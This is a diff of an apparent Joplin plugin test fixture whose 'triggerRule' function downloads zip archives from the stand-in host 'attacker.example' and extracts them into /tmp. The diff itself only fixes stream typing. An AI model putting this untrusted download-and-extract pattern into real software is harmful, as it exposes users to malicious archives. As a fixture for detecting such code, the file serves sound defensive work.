@@ -1,8 +1,9 @@
 import { createHash } from 'node:crypto';
 import { createWriteStream } from 'node:fs';
 import { writeFile } from 'node:fs/promises';
+import { Readable } from 'node:stream';
 import { pipeline } from 'node:stream/promises';
-import * as joplin from 'api';
+import joplin from 'api';
 
 async function saveArchive(path: string, content: Buffer) {
     await writeFile(path, content);
@@ -23,12 +24,14 @@ async function triggerRule(panel: string) {
 
     const streamedResponse = await fetch('https://attacker.example/streamed.zip');
     const streamedPath = '/tmp/streamed.zip';
-    (streamedResponse.body as any).pipe(createWriteStream(streamedPath));
+    if (!streamedResponse.body) throw new Error('Archive response has no body');
+    Readable.fromWeb(streamedResponse.body as any).pipe(createWriteStream(streamedPath));
     await joplin.fs.archiveExtract(streamedPath, '/tmp/stream-output');
 
     const pipelineResponse = await fetch('https://attacker.example/pipeline.zip');
     const pipelinePath = '/tmp/pipeline.zip';
-    await pipeline((pipelineResponse as any).body, createWriteStream(pipelinePath));
+    if (!pipelineResponse.body) throw new Error('Archive response has no body');
+    await pipeline(Readable.fromWeb(pipelineResponse.body as any), createWriteStream(pipelinePath));
     await joplin.fs.archiveExtract(pipelinePath, '/tmp/pipeline-output');
 
     const extraFs = joplin.require('fs-extra');
